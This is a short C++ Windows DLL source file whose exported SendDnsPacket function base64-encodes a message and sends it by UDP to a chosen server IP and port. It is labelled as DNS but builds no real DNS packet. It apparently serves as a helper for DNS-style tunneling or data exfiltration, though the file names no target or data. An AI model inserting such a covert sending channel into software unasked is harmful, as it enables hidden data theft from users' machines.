#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <cstdio>

#include "../common/Logger.h"

#pragma comment(lib, "Ws2_32.lib")

extern "C" __declspec(dllexport)
bool SendDnsPacket(const char* msg, const char* dnsServer, unsigned short port)
{
    if (!msg || !dnsServer) {
        fprintf(stderr, "[ERROR] Invalid arguments\n");
        return false;
    }

    //  Initialize Winsock (safe for repeated calls) 
    WSADATA wsaData;
    int wsaInit = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (wsaInit != 0) {
        fprintf(stderr, "[ERROR] WSAStartup failed: %d\n", wsaInit);
        return false;
    }

    //  Encode payload 
    size_t b64_len = 0;
    char* b64names = base64_encode(
        reinterpret_cast<const unsigned char*>(msg),
        strlen(msg),
        &b64_len
    );

    if (!b64names || b64_len == 0) {
        fprintf(stderr, "[ERROR] Base64 encoding failed\n");
        WSACleanup();
        return false;
    }

    //  Setup destination 
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);

    if (inet_pton(AF_INET, dnsServer, &serverAddr.sin_addr) <= 0) {
        fprintf(stderr, "[ERROR] Invalid DNS server IP: %s\n", dnsServer);
        free(b64names);
        WSACleanup();
        return false;
    }

    //  Create socket 
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] Socket creation failed: %d\n", WSAGetLastError());
        free(b64names);
        WSACleanup();
        return false;
    }

    // Send packet
    int sent = sendto(
        sock,
        b64names,
        static_cast<int>(b64_len),
        0,
        reinterpret_cast<sockaddr*>(&serverAddr),
        sizeof(serverAddr)
    );

    if (sent == SOCKET_ERROR) {
        fprintf(stderr, "[ERROR] sendto failed: %d\n", WSAGetLastError());
        closesocket(sock);
        free(b64names);
        WSACleanup();
        return false;
    }

    printf("[INFO] Sent %d bytes to %s:%d\n", sent, dnsServer, port);

    //  Cleanup 
    closesocket(sock);
    free(b64names);
    WSACleanup();

    return true;
}